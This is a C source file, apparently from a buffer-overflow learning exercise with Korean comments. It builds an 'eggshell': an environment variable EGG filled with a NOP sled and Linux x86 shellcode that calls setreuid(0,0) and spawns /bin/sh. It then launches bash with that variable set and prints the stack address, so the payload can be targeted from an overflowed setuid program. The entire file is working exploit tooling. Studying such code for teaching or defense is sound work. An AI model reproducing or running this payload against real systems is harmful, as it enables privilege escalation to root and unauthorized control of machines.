#include<stdlib.h>

#define _OFFSET 0
#define _BUFFER_SIZE 512
#define _EGG_SIZE 2048
#define NOP 0x90

char shellcode[] ="\x31\xc0"
"\x31\xdb"
"\xb0\x46"
"\xcd\x80"
"\x31\xc0"
"\x50"
"\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x89\xc2"
"\xb0\x0b"
"\xcd\x80"
"\x31\xc0\xb0\x01\xcd\x80";
unsigned long get_esp(){
    __asm__ __volatile__("movl %esp, %eax"); /* esp의 address를 return */
}
int main(int argc, char **argv){
    char *ptr, *egg;
    long *addr_ptr, addr;
    int i;
    int offset = _OFFSET, bsize = _BUFFER_SIZE, eggsize = _EGG_SIZE;
    if(argc > 1) bsize = atoi(argv[1]);
    if(argc > 2) offset = atoi(argv[2]);
    if(argc > 3) eggsize = atoi(argv[3]);
    if(!(egg = malloc(eggsize))){ /* NOP와 쉘 코드를 넣을 버퍼 생성 */
        printf("Cannot allocate egg.\n");
        exit(0);
    }
    addr = get_esp() - offset; /* stack pointer를 얻어 옴 */
    printf("esp : %p\n", addr); /* esp 값 출력 */
    ptr = egg;
    for(i=0; i<eggsize - strlen(shellcode) -1 ; i++)
        *(ptr++) = NOP; /* egg를 NOP로 먼저 채우고 */
    for(i=0 ; i<strlen(shellcode) ; i++)
        *(ptr++) = shellcode[i]; /* 남은 공간을 쉘 코드로 채움 */
    egg[eggsize-1] = '\0';
    memcpy(egg, "EGG=",4);
    putenv(egg);
    system("/bin/bash");
    /* EGG라는 환경 변수로 등록 */ /* 환경 변수가 적용된 쉘 실행 */
}
